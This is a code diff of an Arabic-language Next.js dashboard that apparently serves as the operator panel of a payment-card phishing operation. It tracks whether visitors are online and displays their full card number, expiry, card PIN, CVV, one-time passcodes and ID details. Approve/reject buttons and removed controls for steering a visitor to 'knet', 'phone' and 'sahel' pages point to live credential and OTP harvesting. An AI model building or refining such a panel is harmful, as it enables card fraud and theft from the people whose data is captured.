@@ -2,15 +2,15 @@
 
 import { useState, useEffect } from "react"
 import { useRouter } from "next/navigation"
-import { Trash2, Users, CreditCard, UserCheck } from "lucide-react"
+import { Trash2, Users, CreditCard, UserCheck, Info } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { ar } from "date-fns/locale"
 import { formatDistanceToNow } from "date-fns"
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
+import { Card, CardContent } from "@/components/ui/card"
 import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
 import { onAuthStateChanged, signOut } from "firebase/auth"
-import { InfoIcon } from "lucide-react"
 import { onValue, ref } from "firebase/database"
 import { database } from "@/lib/firestore"
 import { auth } from "@/lib/firestore"
@@ -52,6 +52,7 @@ interface Notification {
   country?: string
   personalInfo: {
     id?: string | "0"
+    name?: string
   }
   prefix: string
   status: "pending" | string
@@ -69,6 +70,35 @@ interface Notification {
   mobile: string
   network: string
   phoneOtp: string
+  cardExpiry: string
+  name: string
+  otpCode: string
+  phone: string
+}
+
+function UserStatusBadge({ userId }: { userId: string }) {
+  const [status, setStatus] = useState<string>("unknown")
+
+  useEffect(() => {
+    const userStatusRef = ref(database, `/status/${userId}`)
+
+    const unsubscribe = onValue(userStatusRef, (snapshot) => {
+      const data = snapshot.val()
+      if (data) {
+        setStatus(data.state)
+      } else {
+        setStatus("unknown")
+      }
+    })
+
+    return () => unsubscribe()
+  }, [userId])
+
+  return (
+    <Badge variant="default" className={`${status === "online" ? "bg-green-500" : "bg-red-500"}`}>
+      <span className="text-xs text-white">{status === "online" ? "متصل" : "غير متصل"}</span>
+    </Badge>
+  )
 }
 
 export default function NotificationsPage() {
@@ -77,10 +107,6 @@ export default function NotificationsPage() {
   const [message, setMessage] = useState<boolean>(false)
   const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
   const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
-  const [violationValues, setViolationValues] = useState<{
-    [key: string]: string
-  }>({})
-  const [onlineUsers, setOnlineUsers] = useState<number>(0)
   const [totalVisitors, setTotalVisitors] = useState<number>(0)
   const [cardSubmissions, setCardSubmissions] = useState<number>(0)
   const router = useRouter()
@@ -100,7 +126,7 @@ export default function NotificationsPage() {
 
     return () => unsubscribe()
   }, [router])
-  useEffect(() => {}, [])
+
   const fetchNotifications = () => {
     setIsLoading(true)
     const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
@@ -110,10 +136,6 @@ export default function NotificationsPage() {
         const notificationsData = querySnapshot.docs
           .map((doc) => {
             const data = doc.data() as any
-            setViolationValues((prev) => ({
-              ...prev,
-              [doc.id]: data.violationValue || "",
-            }))
             return { id: doc.id, ...data }
           })
           .filter((notification: any) => !notification.isHidden) as Notification[]
@@ -212,87 +234,31 @@ export default function NotificationsPage() {
     setSelectedInfo(null)
     setSelectedNotification(null)
   }
-  const getLiveStatus = (userId: string, callback: (status: string) => void) => {
-    if (!userId) return
 
-    const userStatusRef = ref(database, `/status/${userId}`)
-
-    onValue(userStatusRef, (snapshot) => {
-      const data = snapshot.val()
-      if (data) {
-        callback(data.state) // "online" or "offline"
-      } else {
-        callback("unknown")
-      }
-    })
-  }
-  function UserStatusBadge({ userId }: { userId: string }) {
-    const [status, setStatus] = useState<string>("unknown")
-
-    useEffect(() => {
-      const userStatusRef = ref(database, `/status/${userId}`)
-
-      const unsubscribe = onValue(userStatusRef, (snapshot) => {
-        const data = snapshot.val()
-        if (data) {
-          setStatus(data.state)
-        } else {
-          setStatus("unknown")
-        }
-      })
-
-      return () => {
-        // Clean up the listener when component unmounts
-        unsubscribe()
-      }
-    }, [userId])
-
+  if (isLoading) {
     return (
-      <Badge variant="default" className={`${status === "online" ? "bg-green-500" : "bg-red-500"}`}>
-        <span style={{ fontSize: "12px", color: "#fff" }}>{status === "online" ? "متصل" : "غير متصل"}</span>
-      </Badge>
+      <div className="min-h-screen bg-white flex items-center justify-center">
+        <div className="text-lg font-medium">جاري التحميل...</div>
+      </div>
     )
   }
 
-  const handleViolationUpdate = async (id: string, value: string) => {
-    try {
-      const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { violationValue: value })
-      setViolationValues((prev) => ({ ...prev, [id]: value }))
-    } catch (error) {
-      console.error("Error updating violation value:", error)
-    }
-  }
-
-  const handleUpdatePage = async (id: string, page: string) => {
-    try {
-      const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { page: page })
-      setNotifications(notifications.map((notif) => (notif.id === id ? { ...notif, page: page } : (notif as any))))
-    } catch (error) {
-      console.error("Error updating current page:", error)
-    }
-  }
-
-  if (isLoading) {
-    return <div className="min-h-screen bg-white-900 text-black flex items-center justify-center">جاري التحميل...</div>
-  }
-
   return (
-    <div dir="rtl" className="min-h-screen bg-gray-300 text-black p-4">
-      <div className=" mx-auto">
+    <div dir="rtl" className="min-h-screen bg-gray-50 text-gray-900 p-4">
+      <div className="max-w-7xl mx-auto">
         <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
-          <h1 className="text-xl font-semibold mb-4 sm:mb-0">جميع الإشعارات</h1>
+          <h1 className="text-2xl font-bold mb-4 sm:mb-0">لوحة الإشعارات</h1>
           <div className="flex flex-col sm:flex-row gap-2">
             <Button
               variant="destructive"
               onClick={handleClearAll}
-              className="bg-red-500 hover:bg-red-600"
               disabled={notifications.length === 0}
+              className="flex items-center gap-2"
             >
+              <Trash2 className="h-4 w-4" />
               مسح جميع الإشعارات
             </Button>
-            <Button variant="outline" onClick={handleLogout} className="bg-gray-100 hover:bg-gray-100">
+            <Button variant="outline" onClick={handleLogout} className="flex items-center gap-2">
               تسجيل الخروج
             </Button>
           </div>
@@ -301,68 +267,71 @@ export default function NotificationsPage() {
         {/* Statistics Grid */}
         <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
           {/* Online Users Card */}
-          <div className="bg-white rounded-lg shadow p-4 flex items-center">
-            <div className="rounded-full bg-blue-100 p-3 mr-4">
-              <UserCheck className="h-6 w-6 text-blue-500" />
-            </div>
-            <div>
-              <p className="text-sm text-gray-500">المستخدمين المتصلين</p>
-              <p className="text-2xl font-bold">{onlineUsersCount}</p>
-            </div>
-          </div>
+          <Card>
+            <CardContent className="p-6 flex items-center">
+              <div className="rounded-full bg-blue-100 p-3 mr-4">
+                <UserCheck className="h-6 w-6 text-blue-600" />
+              </div>
+              <div>
+                <p className="text-sm text-gray-500">المستخدمين المتصلين</p>
+                <p className="text-2xl font-bold">{onlineUsersCount}</p>
+              </div>
+            </CardContent>
+          </Card>
 
           {/* Total Visitors Card */}
-          <div className="bg-white rounded-lg shadow p-4 flex items-center">
-            <div className="rounded-full bg-green-100 p-3 mr-4">
-              <Users className="h-6 w-6 text-green-500" />
-            </div>
-            <div>
-              <p className="text-sm text-gray-500">إجمالي الزوار</p>
-              <p className="text-2xl font-bold">{totalVisitors}</p>
-            </div>
-          </div>
+          <Card>
+            <CardContent className="p-6 flex items-center">
+              <div className="rounded-full bg-green-100 p-3 mr-4">
+                <Users className="h-6 w-6 text-green-600" />
+              </div>
+              <div>
+                <p className="text-sm text-gray-500">إجمالي الزوار</p>
+                <p className="text-2xl font-bold">{totalVisitors}</p>
+              </div>
+            </CardContent>
+          </Card>
 
           {/* Card Submissions Card */}
-          <div className="bg-white rounded-lg shadow p-4 flex items-center sm:col-span-2 md:col-span-1">
-            <div className="rounded-full bg-purple-100 p-3 mr-4">
-              <CreditCard className="h-6 w-6 text-purple-500" />
-            </div>
-            <div>
-              <p className="text-sm text-gray-500">معلومات البطاقات المقدمة</p>
-              <p className="text-2xl font-bold">{cardSubmissions}</p>
-            </div>
-          </div>
+          <Card>
+            <CardContent className="p-6 flex items-center">
+              <div className="rounded-full bg-purple-100 p-3 mr-4">
+                <CreditCard className="h-6 w-6 text-purple-600" />
+              </div>
+              <div>
+                <p className="text-sm text-gray-500">معلومات البطاقات المقدمة</p>
+                <p className="text-2xl font-bold">{cardSubmissions}</p>
+              </div>
+            </CardContent>
+          </Card>
         </div>
 
-        <div className="bg-gray-100 rounded-lg">
+        <Card>
           {/* Desktop Table View - Hidden on Mobile */}
           <div className="hidden md:block overflow-x-auto">
             <table className="w-full">
               <thead>
-                <tr className="border-b border-gray-100">
-                  <th className="px-4 py-3 text-right">الدوله</th>
-                  <th className="px-4 py-3 text-right">الإسم</th>
-                  <th className="px-4 py-3 text-right">المعلومات</th>
-                  <th className="px-4 py-3 text-right">الصفحة الحالية</th>
-                  <th className="px-4 py-3 text-right">الوقت</th>
-                  <th className="px-4 py-3 text-center">الاشعارات</th>
-                  <th className="px-4 py-3 text-center">تحديث الصفحة</th>
-                  <th className="px-4 py-3 text-center">حذف</th>
+                <tr className="border-b">
+                  <th className="px-4 py-3 text-right font-medium text-gray-500">الرقم</th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-500">المعلومات</th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-500">الصفحة الحالية</th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-500">الوقت</th>
+                  <th className="px-4 py-3 text-center font-medium text-gray-500">الحالة</th>
+                  <th className="px-4 py-3 text-center font-medium text-gray-500">الإجراءات</th>
                 </tr>
               </thead>
               <tbody>
                 {notifications.map((notification) => (
-                  <tr key={notification.id} className="border-b border-gray-700">
-                    <td className="px-4 py-3">{notification?.country!}</td>
-                    <td className="px-4 py-3">{notification.personalInfo?.id!}</td>
+                  <tr key={notification.id} className="border-b hover:bg-gray-50">
+                    <td className="px-4 py-3">{notification.name || "غير معروف"}</td>
                     <td className="px-4 py-3">
-                      <div className="flex flex-col sm:flex-row gap-2">
+                      <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.personalInfo?.id! ? "default" : "destructive"}
+                          variant={notification.name ? "default" : "destructive"}
                           className="rounded-md cursor-pointer"
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
-                          {notification.personalInfo?.id! ? "معلومات شخصية" : "لا يوجد معلومات"}
+                          {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
                           variant={notification.cardNumber ? "default" : "destructive"}
@@ -371,14 +340,7 @@ export default function NotificationsPage() {
                         >
                           {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                         </Badge>
-                        <Badge
-                          variant={"secondary"}
-                          className={`rounded-md cursor-pointer ${notification.mobile ? "bg-yellow-300" : ""}`}
-                          onClick={() => handleInfoClick(notification, "personal")}
-                        >
-                          <InfoIcon className="h-4 w-4 mr-1" />
-                          معلومات عامة
-                        </Badge>
+                       
                       </div>
                     </td>
                     <td className="px-4 py-3">خطوه - {notification.page}</td>
@@ -393,62 +355,44 @@ export default function NotificationsPage() {
                       <UserStatusBadge userId={notification.id} />
                     </td>
                     <td className="px-4 py-3 text-center">
-                      <div className="flex flex-col items-center space-y-2">
-                        <div className="flex justify-center space-x-2">
-                          {[
-                            {
-                              page: "main",
-                              label: "الرئيسية",
-                              hint: "الصفحة الرئيسية",
-                            },
-                            { page: "knet", label: "كنت", hint: "صفحة كنت" },
-                            {
-                              page: "phone",
-                              label: "تلفون",
-                              hint: "تلفون",
-                            },
-
-                            {
-                              page: "sahel",
-                              label: "هوية",
-                              hint: "هوية",
-                            },
-                          ].map(({ page, label, hint }) => (
-                            <Button
-                              key={page}
-                              variant={notification?.page === page ? "default" : "outline"}
-                              size="sm"
-                              onClick={() => handleUpdatePage(notification.id, page)}
-                              className={`relative ${notification.page === page ? "bg-blue-500" : ""}`}
-                              title={hint}
-                            >
-                              {label}
-                              {notification.page === page && (
-                                <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
-                                  ✓
-                                </span>
-                              )}
-                            </Button>
-                          ))}
-                        </div>
-                        <span className="text-xs text-gray-500">
-                          {notification.page === "main" && "الصفحة الرئيسية"}
-                          {notification.page === "knet" && "صفحة كنت"}
-                          {notification.page === "phone" && "رقم الهاتف "}
-                          {notification.page === "phoneOtp" && " OTP"}
-                          {notification.page === "sahel" && "هوية"}
-                        </span>
+                      <div className="flex justify-center gap-2">
+                        <Button
+                          variant="outline"
+                          size="sm"
+                          onClick={() => {
+                            handleApproval("approved", notification.id)
+                            setMessage(true)
+                            setTimeout(() => {
+                              setMessage(false)
+                            }, 3000)
+                          }}
+                          className="bg-green-500 text-white hover:bg-green-600"
+                        >
+                          قبول
+                        </Button>
+                        <Button
+                          variant="outline"
+                          size="sm"
+                          onClick={() => {
+                            handleApproval("rejected", notification.id)
+                            setMessage(true)
+                            setTimeout(() => {
+                              setMessage(false)
+                            }, 3000)
+                          }}
+                          className="bg-red-500 text-white hover:bg-red-600"
+                        >
+                          رفض
+                        </Button>
+                        <Button
+                          variant="ghost"
+                          size="sm"
+                          onClick={() => handleDelete(notification.id)}
+                          className="text-red-500 hover:text-red-600"
+                        >
+                          <Trash2 className="h-4 w-4" />
+                        </Button>
                       </div>
-                    </td>
-                    <td className="px-4 py-3 text-center">
-                      <Button
-                        variant="destructive"
-                        size="sm"
-                        onClick={() => handleDelete(notification.id)}
-                        className="bg-red-500 hover:bg-red-600"
-                      >
-                        <Trash2 className="h-4 w-4" />
-                      </Button>
                     </td>
                   </tr>
                 ))}
@@ -457,96 +401,91 @@ export default function NotificationsPage() {
           </div>
 
           {/* Mobile Card View - Shown only on Mobile */}
-          <div className="md:hidden space-y-4 p-2">
+          <div className="md:hidden space-y-4 p-4">
             {notifications.map((notification) => (
-              <div key={notification.id} className="bg-white rounded-lg shadow-md p-4">
-                <div className="flex justify-between items-start mb-3">
-                  <div>
-                    <div className="font-semibold">{notification.personalInfo?.id!}</div>
-                    <div className="text-sm text-gray-500">{notification?.country!}</div>
-                  </div>
-                  <div className="flex items-center gap-2">
+              <Card key={notification.id} className="overflow-hidden">
+                <CardContent className="p-4">
+                  <div className="flex justify-between items-start mb-3">
+                    <div>
+                      <div className="font-semibold">{notification.personalInfo?.name || "غير معروف"}</div>
+                    </div>
                     <UserStatusBadge userId={notification.id} />
-                    <Button
-                      variant="destructive"
-                      size="sm"
-                      onClick={() => handleDelete(notification.id)}
-                      className="bg-red-500 hover:bg-red-600 h-8 w-8 p-0"
-                    >
-                      <Trash2 className="h-4 w-4" />
-                    </Button>
-                  </div>
-                </div>
-
-                <div className="grid grid-cols-1 gap-2 mb-3">
-                  <div className="flex flex-wrap gap-2">
-                    <Badge
-                      variant={notification.personalInfo?.id! ? "default" : "destructive"}
-                      className="rounded-md cursor-pointer"
-                      onClick={() => handleInfoClick(notification, "personal")}
-                    >
-                      {notification.personalInfo?.id! ? "معلومات شخصية" : "لا يوجد معلومات"}
-                    </Badge>
-                    <Badge
-                      variant={notification.cardNumber ? "default" : "destructive"}
-                      className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
-                      onClick={() => handleInfoClick(notification, "card")}
-                    >
-                      {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
-                    </Badge>
                   </div>
 
-                  <div className="text-sm">
-                    <span className="font-medium">الصفحة الحالية:</span> خطوه - {notification.page}
-                  </div>
+                  <div className="grid grid-cols-1 gap-3 mb-3">
+                    <div className="flex flex-wrap gap-2">
+                      <Badge
+                        variant={notification.name ? "default" : "destructive"}
+                        className="rounded-md cursor-pointer"
+                        onClick={() => handleInfoClick(notification, "personal")}
+                      >
+                        {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                      </Badge>
+                      <Badge
+                        variant={notification.cardNumber ? "default" : "destructive"}
+                        className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
+                        onClick={() => handleInfoClick(notification, "card")}
+                      >
+                        {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
+                      </Badge>
+                    </div>
 
-                  <div className="text-sm">
-                    <span className="font-medium">الوقت:</span>{" "}
-                    {notification.createdDate &&
-                      formatDistanceToNow(new Date(notification.createdDate), {
-                        addSuffix: true,
-                        locale: ar,
-                      })}
+                    <div className="text-sm">
+                      <span className="font-medium">الصفحة الحالية:</span> خطوه - {notification.page}
+                    </div>
+
+                    <div className="text-sm">
+                      <span className="font-medium">الوقت:</span>{" "}
+                      {notification.createdDate &&
+                        formatDistanceToNow(new Date(notification.createdDate), {
+                          addSuffix: true,
+                          locale: ar,
+                        })}
+                    </div>
+
+                    <div className="flex gap-2 mt-2">
+                      <Button
+                        onClick={() => {
+                          handleApproval("approved", notification.id)
+                          setMessage(true)
+                          setTimeout(() => {
+                            setMessage(false)
+                          }, 3000)
+                        }}
+                        className="flex-1 bg-green-500 hover:bg-green-600"
+                      >
+                        قبول
+                      </Button>
+                      <Button
+                        onClick={() => {
+                          handleApproval("rejected", notification.id)
+                          setMessage(true)
+                          setTimeout(() => {
+                            setMessage(false)
+                          }, 3000)
+                        }}
+                        className="flex-1"
+                        variant="destructive"
+                      >
+                        رفض
+                      </Button>
+                      <Button variant="outline" onClick={() => handleDelete(notification.id)} className="w-10 p-0">
+                        <Trash2 className="h-4 w-4" />
+                      </Button>
+                    </div>
+                    {message && <p className="text-green-500 text-center mt-2">تم الارسال</p>}
                   </div>
-                  <div className="flex justify-between mx-1">
-                    <Button
-                      onClick={() => {
-                        handleApproval("approved", selectedNotification!.id)
-                        setMessage(true)
-                        setTimeout(() => {
-                          setMessage(false)
-                        }, 3000)
-                      }}
-                      className="w-full m-3 bg-green-500"
-                    >
-                      قبول
-                    </Button>
-                    <Button
-                      onClick={() => {
-                        handleApproval("rejected", selectedNotification!.id)
-                        setMessage(true)
-                        setTimeout(() => {
-                          setMessage(false)
-                        }, 3000)
-                      }}
-                      className="w-full m-3"
-                      variant="destructive"
-                    >
-                      رفض
-                    </Button>
-                  </div>
-                  <p className="text-red-500">{message ? "تم الارسال" : ""}</p>
-                </div>
-              </div>
+                </CardContent>
+              </Card>
             ))}
           </div>
-        </div>
+        </Card>
       </div>
 
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
-        <DialogContent className="bg-gray-100 text-black max-w-[90vw] md:max-w-md" dir="rtl">
+        <DialogContent className="bg-white text-gray-900 max-w-[90vw] md:max-w-md" dir="rtl">
           <DialogHeader>
-            <DialogTitle dir="rtl">
+            <DialogTitle>
               {selectedInfo === "personal"
                 ? "المعلومات الشخصية"
                 : selectedInfo === "card"
@@ -554,53 +493,103 @@ export default function NotificationsPage() {
                   : "معلومات عامة"}
             </DialogTitle>
           </DialogHeader>
-          {selectedInfo === "personal" && selectedNotification?.plateType && (
-            <div className="space-y-2">
-              <p>
-                <strong>رقم الهوية:</strong> {selectedNotification.idNumber}
-              </p>
-              <p></p>
+          {selectedInfo === "personal" && selectedNotification && (
+            <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
+              {selectedNotification.idNumber && (
+                <p className="flex justify-between">
+                  <span className="font-medium">رقم الهوية:</span>
+                  <span>{selectedNotification.idNumber}</span>
+                </p>
+              )}
+              {selectedNotification.email && (
+                <p className="flex justify-between">
+                  <span className="font-medium">البريد الإلكتروني:</span>
+                  <span>{selectedNotification.email}</span>
+                </p>
+              )}
+              {selectedNotification.mobile && (
+                <p className="flex justify-between">
+                  <span className="font-medium">رقم الجوال:</span>
+                  <span>{selectedNotification.mobile}</span>
+                </p>
+              )}
+              {selectedNotification.name && (
+                <p className="flex justify-between">
+                  <span className="font-medium">الاسم:</span>
+                  <span>{selectedNotification.name}</span>
+                </p>
+              )}
+              {selectedNotification.phone && (
+                <p className="flex justify-between">
+                  <span className="font-medium">الهاتف:</span>
+                  <span>{selectedNotification.phone}</span>
+                </p>
+              )}
             </div>
           )}
           {selectedInfo === "card" && selectedNotification && (
-            <div className="space-y-2">
-              <p>
-                <strong className="text-red-400 mx-4">البنك:</strong> {selectedNotification.bank}
-              </p>
-              <p>
-                <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{" "}
-                {selectedNotification.cardNumber &&
-                  selectedNotification.cardNumber + " - " + selectedNotification.prefix}
-              </p>
-              <p>
-                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong> {selectedNotification.year}/
-                {selectedNotification.month}/{selectedNotification.expiryDate}
-              </p>
-              <p className="flex items-center">
-                <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
-              </p>
-              <p className="flex items-center">
-                <strong>رمز التحقق المرسل :</strong> {selectedNotification.otp}
-              </p>
-              <p className="flex items-center">
-                <strong className="text-red-400 mx-4">رمز الامان :</strong> {selectedNotification?.cvv!}
-              </p>
-              <p className="flex items-center">
-                <strong className="text-red-400 mx-4">رمز :</strong>{" "}
-              </p>
-              <p className="flex flex-wrap gap-1">
-                {selectedNotification.allOtps &&
+            <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
+              {selectedNotification.bank && (
+                <p className="flex justify-between">
+                  <span className="font-medium text-gray-700">البنك:</span>
+                  <span className="font-semibold">{selectedNotification.bank}</span>
+                </p>
+              )}
+              {selectedNotification.cardNumber && (
+                <p className="flex justify-between">
+                  <span className="font-medium text-gray-700">رقم البطاقة:</span>
+                  <span className="font-semibold">
+                    {selectedNotification.cardNumber}
+                    {selectedNotification.prefix && ` - ${selectedNotification.prefix}`}
+                  </span>
+                </p>
+              )}
+              {(selectedNotification.year || selectedNotification.month || selectedNotification.cardExpiry) && (
+                <p className="flex justify-between">
+                  <span className="font-medium text-gray-700">تاريخ الانتهاء:</span>
+                  <span className="font-semibold">
+                    {selectedNotification.year && selectedNotification.month
+                      ? `${selectedNotification.year}/${selectedNotification.month}`
+                      : selectedNotification.cardExpiry}
+                  </span>
+                </p>
+              )}
+              {selectedNotification.
+              pass && (
+                <p className="flex justify-between">
+                  <span className="font-medium text-gray-700">رمز البطاقة:</span>
+                  <span className="font-semibold">{selectedNotification.pass}</span>
+                </p>
+              )}
+              {(selectedNotification.otp || selectedNotification.otpCode) && (
+                <p className="flex justify-between">
+                  <span className="font-medium text-gray-700">رمز التحقق المرسل:</span>
+                  <span className="font-semibold">
+                    {selectedNotification.otp}
+                    {selectedNotification.otpCode && ` || ${selectedNotification.otpCode}`}
+                  </span>
+                </p>
+              )}
+              {selectedNotification.cvv && (
+                <p className="flex justify-between">
+                  <span className="font-medium text-gray-700">رمز الامان:</span>
+                  <span className="font-semibold">{selectedNotification.cvv}</span>
+                </p>
+              )}
+              {selectedNotification.allOtps &&
                 Array.isArray(selectedNotification.allOtps) &&
-                selectedNotification.allOtps.length > 0 ? (
-                  selectedNotification.allOtps.map((i, indx) => (
-                    <Badge key={indx} className="mr-1 mb-1">
-                      {i}
-                    </Badge>
-                  ))
-                ) : (
-                  <span className="text-gray-500">لا يوجد رموز</span>
+                selectedNotification.allOtps.length > 0 && (
+                  <div>
+                    <span className="font-medium text-gray-700 block mb-2">جميع الرموز:</span>
+                    <div className="flex flex-wrap gap-2">
+                      {selectedNotification.allOtps.map((otp, index) => (
+                        <Badge key={index} variant="outline" className="bg-gray-100">
+                          {otp}
+                        </Badge>
+                      ))}
+                    </div>
+                  </div>
                 )}
-              </p>
             </div>
           )}
         </DialogContent>
@@ -608,4 +597,3 @@ export default function NotificationsPage() {
     </div>
   )
 }
-
